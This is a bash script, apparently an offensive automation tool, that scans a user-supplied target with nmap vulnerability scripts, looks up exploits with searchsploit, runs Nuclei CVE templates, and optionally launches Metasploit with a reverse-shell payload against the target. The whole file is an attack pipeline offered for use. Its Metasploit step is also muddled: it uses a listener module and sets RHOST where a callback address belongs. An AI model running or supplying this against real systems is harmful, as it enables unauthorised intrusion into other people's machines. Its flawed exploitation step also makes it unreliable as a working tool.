#!/bin/bash

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root!" 
   exit 1
fi

# Ask for target IP or domain
read -p "Enter target IP or domain: " TARGET

# Create an output directory
mkdir -p exploits && cd exploits

# Step 1: Run Nmap Scan with Vulnerability Scripts
echo "[*] Running Nmap vulnerability scan..."
nmap -p- -sV --script=vuln "$TARGET" -oN nmap_vuln_scan.txt

# Step 2: Extract Service Information & Search for Exploits
echo "[*] Extracting services and checking for exploits..."
grep -E "open|tcp|udp" nmap_vuln_scan.txt | awk '{print $3, $4}' | sort -u > services.txt

while read -r SERVICE; do
    echo "[+] Searching exploits for: $SERVICE"
    searchsploit "$SERVICE" | tee -a searchsploit_results.txt
done < services.txt

# Step 3: Check for Known CVEs Using Nuclei
echo "[*] Running Nuclei for CVE-based scanning..."
nuclei -u "$TARGET" -t cves/ -o nuclei_cve_scan.txt

# Step 4: Metasploit Auto Exploitation (Optional)
read -p "Do you want to try auto-exploitation with Metasploit? (y/n): " EXPLOIT

if [[ "$EXPLOIT" == "y" ]]; then
    echo "[*] Launching Metasploit for possible exploits..."
    msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set RHOST $TARGET; run"
fi

echo "[*] Exploitation process complete. Check the 'exploits/' directory for results."
